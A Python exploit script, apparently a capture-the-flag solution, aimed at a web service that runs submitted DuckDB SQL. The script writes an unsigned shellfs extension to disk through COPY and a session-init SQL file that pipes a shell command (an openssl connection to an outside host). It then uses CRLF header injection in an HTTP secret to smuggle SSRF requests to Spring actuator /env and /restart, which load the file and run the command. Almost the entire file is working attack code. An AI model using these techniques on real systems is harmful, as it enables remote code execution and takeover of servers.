#!/usr/bin/env python3
import requests
import json
import sys
import base64
import os
import time
from pathlib import Path

# 配置
TARGET_URL = "http://jm9rvrxxjm9ppx9p.instance.penguin.0ops.sjtu.cn:18080/duck"

def send_sql(sql):
    """发送 SQL 查询"""
    payload = {"sql": sql}
    print(f"[*] Sending SQL: {sql[:100]}..." if len(sql) > 100 else f"[*] Sending SQL: {sql}")
    
    try:
        response = requests.post(TARGET_URL, json=payload, timeout=10)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Response: {response.text[:200]}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"[-] Error: {e}")
        return None

def find_extension_files():
    """查找 shellfs 扩展文件"""
    files_to_find = [
        "shellfs.duckdb_extension.info",
        "shellfs.duckdb_extension"
    ]
    
    # 搜索路径
    search_paths = [
        Path.cwd(),  # 当前工作目录
        Path.home() / ".duckdb/extensions/v1.4.1/linux_amd64",  # DuckDB 扩展目录
    ]
    
    found_files = {}
    
    for filename in files_to_find:
        for search_path in search_paths:
            file_path = search_path / filename
            if file_path.exists():
                print(f"[+] Found {filename} at: {file_path}")
                found_files[filename] = file_path
                break
        
        if filename not in found_files:
            print(f"[-] {filename} not found in:")
            for path in search_paths:
                print(f"    - {path}")
    
    if len(found_files) != len(files_to_find):
        print("\n[!] Missing extension files!")
        print("[!] Run the following SQL in DuckDB v1.4.1:")
        print("[!]   INSTALL shellfs FROM community;")
        return None
    
    return found_files

def main():
    print("[*] Starting exploit...")
    
    # 查找扩展文件
    print("\n[*] Searching for shellfs extension files...")
    extension_files = find_extension_files()
    if not extension_files:
        return
    
    # 读取扩展文件
    extensions_base64 = {}
    for filename, filepath in extension_files.items():
        print(f"\n[*] Reading {filename} from: {filepath}")
        try:
            with open(filepath, "rb") as f:
                file_data = f.read()
            file_base64 = base64.b64encode(file_data).decode()
            extensions_base64[filename] = file_base64
            print(f"[+] File size: {len(file_data)} bytes")
            print(f"[+] Base64 size: {len(file_base64)} characters")
        except Exception as e:
            print(f"[-] Error reading {filename}: {e}")
            return
    
    # Step 1: 上传 .info 文件
    print("\n[*] Step 1: Uploading shellfs.duckdb_extension.info")
    sql_step1 = f"COPY (SELECT from_base64('{extensions_base64['shellfs.duckdb_extension.info']}') AS s) TO '/home/user/.duckdb/extensions/v1.4.1/linux_amd64/shellfs.duckdb_extension.info' (FORMAT BLOB);"
    response1 = send_sql(sql_step1)
    
    
    # Step 2: 上传扩展本体
    print("\n[*] Step 2: Uploading shellfs.duckdb_extension")
    sql_step2 = f"COPY (SELECT from_base64('{extensions_base64['shellfs.duckdb_extension']}') AS s) TO '/home/user/.duckdb/extensions/v1.4.1/linux_amd64/shellfs.duckdb_extension' (FORMAT BLOB);"
    response2 = send_sql(sql_step2)

    
    # Step 3：写入 /tmp/session.sql
    print("\n[*] Step 3: Writing /tmp/session.sql with flag extraction SQL")
    session_sql_text = "load shellfs; COPY (SELECT * from read_csv('(openssl s_client -no-interactive www.baidu.com:443) |', columns={'a':'blob'})) TO '/tmp/a.txt' (FORMAT BLOB);"
    session_sql_b64 = base64.b64encode(session_sql_text.encode()).decode()
    sql_step3 = f"COPY (SELECT from_base64('{session_sql_b64}') AS s) TO '/tmp/session2.sql' (FORMAT BLOB);"
    response3 = send_sql(sql_step3)

    
    # Step 4: SSRF 修改配置
    print("\n[*] Step 4: SSRF to /actuator/env (modify datasource URL)")
    sql_step4 = ''.join([
        "CREATE OR REPLACE SECRET http_auth (TYPE http,EXTRA_HTTP_HEADERS MAP {'AAAA': url_decode('",
        "x%0d%0aConnection%3a%20keep-alive%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0a%0d%0a",
        "POST%20/actuator/env%20HTTP/1.1%0d%0a",
        "Content-Type%3a%20application/json%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0aContent-Length%3a%20131%0d%0a%0d%0a",
        "{\"name\":\"spring.datasource.url\",\"value\":\"jdbc:duckdb:/tmp/d.db;session_init_sql_file=/tmp/session2.sql;allow_unsigned_extensions=1\"}%0d%0a",
        "%0d%0aGET%20/%20HTTP/1.1')});SELECT * FROM read_csv('http://127.0.0.1:8081/');"
    ])
    response4 = send_sql(sql_step4)
    
    # Step 5: SSRF 重启应用
    print("\n[*] Step 5: SSRF to /actuator/restart")
    sql_step5 = ''.join([
        "CREATE OR REPLACE SECRET http_auth (TYPE http,EXTRA_HTTP_HEADERS MAP {'AAAA': url_decode('",
        "x%0d%0aConnection%3a%20keep-alive%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0a%0d%0a",
        "POST%20/actuator/restart%20HTTP/1.1%0d%0a",
        "Content-Type%3a%20application/json%0d%0aHost%3a%20127.0.0.1%3a8081%0d%0aContent-Length%3a%202%0d%0a%0d%0a",
        "{}",
        "%0d%0aGET%20/%20HTTP/1.1')});SELECT * FROM read_csv('http://127.0.0.1:8081/');"
    ])
    response5 = send_sql(sql_step5)
    
    # Step 6: 等待重启并拿 flag
    print("\n[*] Waiting for application to restart...")
    time.sleep(2)
    print("\n[*] Step 6: Loading shellfs extension and reading flag")
    sql_step6 = "select * from read_csv('/tmp/a.txt',header = false);"
    response6 = send_sql(sql_step6)
    if not response6:
        print("[-] Step 6 failed!")
        return

    print("\n[+] Exploit completed!")
    print("[+] Check the response above for the flag!")

if __name__ == "__main__":
    if len(sys.argv) > 1:
        TARGET_URL = sys.argv[1]
        print(f"[*] Using custom target: {TARGET_URL}")
    
    main()
